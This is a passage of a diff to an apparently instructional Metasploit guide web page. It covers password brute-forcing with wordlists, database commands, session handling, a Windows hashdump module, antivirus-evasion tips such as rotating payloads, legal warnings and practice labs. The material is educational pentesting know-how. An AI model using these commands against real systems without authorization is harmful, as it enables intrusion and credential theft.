+msf6 auxiliary(...) &gt; <span class="cmd">set</span> USER_FILE /usr/share/wordlists/users.txt
+msf6 auxiliary(...) &gt; <span class="cmd">set</span> PASS_FILE /usr/share/wordlists/rockyou.txt
+msf6 auxiliary(...) &gt; <span class="cmd">set</span> THREADS 10
+msf6 auxiliary(...) &gt; <span class="cmd">set</span> STOP_ON_SUCCESS true
+msf6 auxiliary(...) &gt; <span class="cmd">run</span></code>
+        </div>
+    </section>
+
+    <!-- ===== 15 DB ===== -->
+    <section class="section" id="db">
+        <span class="section-number">15 · DATABASE INTEGRATION</span>
+        <h2 class="section-title">
+            <span class="icon">🗄️</span>
+            Metasploit Database Integration
+        </h2>
+        <p>
+            Metasploit integrates with PostgreSQL to store hosts, services, vulnerabilities, loot, and credentials. This is essential for managing large pentests.
+        </p>
+
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># Initialize database (one-time)</span>
+<span class="cmd">sudo</span> msfdb init
+
+<span class="cmt"># Check DB status</span>
+msf6 &gt; <span class="cmd">db_status</span>
+
+<span class="cmt"># Import Nmap scan</span>
+msf6 &gt; <span class="cmd">db_import</span> scan.xml
+
+<span class="cmt"># Import Nessus scan</span>
+msf6 &gt; <span class="cmd">db_import</span> nessus_scan.nessus
+
+<span class="cmt"># Run Nmap directly in Metasploit</span>
+msf6 &gt; <span class="cmd">db_nmap</span> -sV -sC 192.168.1.0/24
+
+<span class="cmt"># List hosts</span>
+msf6 &gt; <span class="cmd">hosts</span>
+
+<span class="cmt"># List services</span>
+msf6 &gt; <span class="cmd">services</span>
+
+<span class="cmt"># List vulnerabilities</span>
+msf6 &gt; <span class="cmd">vulns</span>
+
+<span class="cmt"># List credentials</span>
+msf6 &gt; <span class="cmd">creds</span>
+
+<span class="cmt"># List loot (files, hashes)</span>
+msf6 &gt; <span class="cmd">loot</span>
+
+<span class="cmt"># Search for hosts with specific service</span>
+msf6 &gt; <span class="cmd">services</span> -p 445 -S 192.168.1.</code>
+        </div>
+    </section>
+
+    <!-- ===== 16 BEST ===== -->
+    <section class="section" id="best">
+        <span class="section-number">16 · BEST PRACTICES</span>
+        <h2 class="section-title">
+            <span class="icon">✅</span>
+            Metasploit Best Practices
+        </h2>
+        <ol>
+            <li><strong>Always run <code>check</code> first</strong> — verify vulnerability before exploiting.</li>
+            <li><strong>Use Meterpreter</strong> — more powerful than plain shell.</li>
+            <li><strong>Migrate to a stable process</strong> — prevents session loss if the exploited service crashes.</li>
+            <li><strong>Use <code>setg</code> for LHOST/LPORT</strong> — saves typing.</li>
+            <li><strong>Enable database</strong> — <code>db_nmap</code> and <code>db_import</code> for organized workflow.</li>
+            <li><strong>Background sessions</strong> — keep multiple sessions alive for pivoting.</li>
+            <li><strong>Use stageless payloads</strong> for reliability over slow networks.</li>
+            <li><strong>Rotate payloads</strong> — default signatures are detected by AV.</li>
+            <li><strong>Test in a lab first</strong> — always verify exploits before use.</li>
+            <li><strong>Clean up after yourself</strong> — remove uploaded files, kill sessions.</li>
+        </ol>
+
+        <h3>Session Management</h3>
+        <div class="code-block" data-lang="bash">
+<code><span class="cmt"># List all sessions</span>
+msf6 &gt; <span class="cmd">sessions</span> -l
+
+<span class="cmt"># Interact with a session</span>
+msf6 &gt; <span class="cmd">sessions</span> -i 2
+
+<span class="cmt"># Background current session</span>
+meterpreter &gt; <span class="cmd">background</span>
+
+<span class="cmt"># Upgrade shell to meterpreter</span>
+msf6 &gt; <span class="cmd">sessions</span> -u 1
+
+<span class="cmt"># Run a module against a session</span>
+msf6 &gt; <span class="cmd">use</span> post/windows/gather/hashdump
+msf6 &gt; <span class="cmd">set</span> SESSION 1
+msf6 &gt; <span class="cmd">run</span></code>
+        </div>
+    </section>
+
+    <!-- ===== 17 LEGAL ===== -->
+    <section class="section" id="legal">
+        <span class="section-number">17 · LEGAL &amp; ETHICS</span>
+        <h2 class="section-title">
+            <span class="icon">⚖️</span>
+            Legal &amp; Ethical Boundaries
+        </h2>
+        <div class="callout warn">
+            <strong>⚠️ Critical Warning:</strong> Metasploit is an extremely powerful offensive tool. <strong>Using it against systems you don't own or have explicit written permission to test is a serious federal crime.</strong> Unauthorized access carries up to 10 years in prison in most jurisdictions.
+        </div>
+
+        <h3>Before You Exploit</h3>
+        <ul>
+            <li><strong>Get written authorization</strong> — Signed Rules of Engagement.</li>
+            <li><strong>Define scope</strong> — Only test approved targets.</li>
+            <li><strong>Agree on timing</strong> — Off-hours for production systems.</li>
+            <li><strong>Have a rollback plan</strong> — Some exploits crash systems.</li>
+            <li><strong>Warn the SOC</strong> — So they don't panic when they see shells.</li>
+            <li><strong>Document everything</strong> — Every command, every session, every finding.</li>
         </ul>
 
-        <!-- ===== BOOK HIGHLIGHT ===== -->
-        <div class="book-highlight">
-            <p class="highlight-title">⭐ From Metasploit Beginner to Security Pro</p>
-            <p style="color:#b0b8c8;">
-                No prior penetration testing experience required — Start from the basics and build real-world security skills!
-            </p>
-        </div>
-
-        <!-- ===== FINAL CTA ===== -->
-        <div class="book-highlight" style="border-color:#ffcc00;background:linear-gradient(135deg,rgba(255,204,0,0.05),rgba(0,255,136,0.05));">
-            <p class="highlight-title" style="color:#ffcc00;">🎯 Ready to Master Metasploit?</p>
-            <p style="color:#b0b8c8;font-size:16px;">
-                Start your penetration testing journey and build real-world security skills today.
-            </p>
-            <br/>
-            <a class="main-link" href="https://www.amazon.com/dp/B0H7793S4V" target="_blank" rel="noopener" 
-               style="display:inline-block;padding:15px 42px;background:linear-gradient(135deg,#ffcc00,#ff9900);color:#000000 !important;border-radius:10px;font-weight:700;font-size:16px;text-decoration:none;transition:all 0.3s ease;letter-spacing:0.5px;">
-                🛒 Buy Now on Amazon
-            </a>
-            <p class="small-note" style="color:#6a7290 !important;font-size:13px;margin-top:12px;">
-                Start your Metasploit journey today — Get your copy now!
-            </p>
-        </div>
-
-        <hr/>
-
-        <!-- ===== SHARE SECTION ===== -->
-        <div class="share-section">
-            <p>📤 Share this book recommendation with your network</p>
-            <div class="share-buttons">
-                <a href="#" onclick="window.open('https://twitter.com/intent/tweet?text=Mastering%20Metasploit%20-%20A%20Practical%20Guide%20to%20Penetration%20Testing!%20%23Metasploit%20%23PenTesting%20%23CyberSecurity%20%23EthicalHacking','_blank');return false;">
-                    🐦 Twitter
-                </a>
-                <a href="#" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(window.location.href),'_blank');return false;">
-                    📘 Facebook
-                </a>
-                <a href="#" onclick="window.open('https://www.linkedin.com/sharing/share-offsite/?url='+encodeURIComponent(window.location.href),'_blank');return false;">
-                    💼 LinkedIn
-                </a>
+        <h3>Legal Practice Environments</h3>
+        <div class="use-grid">
+            <div class="use-card">
+                <span class="use-icon">🧪</span>
+                <h4>Metasploitable 2/3</h4>
+                <p>Rapid7's own deliberately vulnerable VMs. Perfect for practice.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🎯</span>
+                <h4>HackTheBox</h4>
+                <p>Realistic machines with Metasploit-friendly vulnerabilities.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">💀</span>
+                <h4>VulnHub</h4>
+                <p>Hundreds of free vulnerable VMs to download and exploit.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🎓</span>
+                <h4>TryHackMe</h4>
+                <p>Guided Metasploit rooms for beginners.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">🏠</span>
+                <h4>Your Own Lab</h4>
+                <p>Windows 7, Server 2008, Metasploitable in VirtualBox.</p>
+            </div>
+            <div class="use-card">
+                <span class="use-icon">☁️</span>
+                <h4>Cloud Labs</h4>
+                <p>Spin up vulnerable VMs on AWS, Azure, or GCP.</p>
             </div>
         </div>
+    </section>
 
-    </div>
+    <!-- ===== 18 CONCLUSION ===== -->
+    <section class="section" id="conclusion">
+        <span class="section-number">18 · CONCLUSION</span>
+        <h2 class="section-title">
+            <span class="icon">🎓</span>
+            Final Thoughts
+        </h2>
+        <p>
+            <strong>Metasploit Framework</strong> is the <strong>most important exploitation tool</strong> in the ethical hacker's arsenal. It's used daily by pentesters, red teams, and bug bounty hunters worldwide. Mastering it is essential for any serious security career.
+        </p>
+        <p>
+            But remember: Metasploit is a <em>tool</em>, not a substitute for knowledge. You still need to understand the vulnerabilities, the target environment, and the attack chain. Metasploit just makes the exploitation phase faster and more reliable.
+        </p>
+        <p>
+            The learning journey:
+        </p>
+        <ol>
+            <li><strong>Learn msfconsole basics</strong> — search, use, show, set, run.</li>
+            <li><strong>Practice with Metasploitable 2/3</strong> — the intended practice target.</li>
+            <li><strong>Master Meterpreter</strong> — post-exploitation is where the real power lies.</li>
+            <li><strong>Learn msfvenom</strong> — generate custom payloads for any format.</li>
+            <li><strong>Practice pivoting</strong> — attack internal networks through a compromised host.</li>
+            <li><strong>Study modules</strong> — read the Ruby source to understand how exploits work.</li>
+            <li><strong>Write your own modules</strong> — the ultimate skill for a Metasploit master.</li>
+        </ol>
+        <div class="callout">
+            <strong>🚀 Next Steps:</strong> Install Metasploitable 3 in VirtualBox, launch Metasploit, and work through the machines on HackTheBox. In a few weeks, you'll be exploiting like a pro.
+        </div>
+        <p style="text-align:center; margin-top: 30px; font-size: 17px; color: #00ff88; font-weight: 600;">
+            Happy hacking — ethically. 💥
+        </p>
+    </section>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="page-footer">
+        <p>© 2025 · <span class="brand">⚡ cyber·sume</span> · Metasploit Framework</p>
+        <p style="margin-top: 8px; font-size: 12px;">Complete Guide · Beginner to Advanced · Updated 2025</p>
+    </footer>
 
 </div>
+
+</body>
+</html>
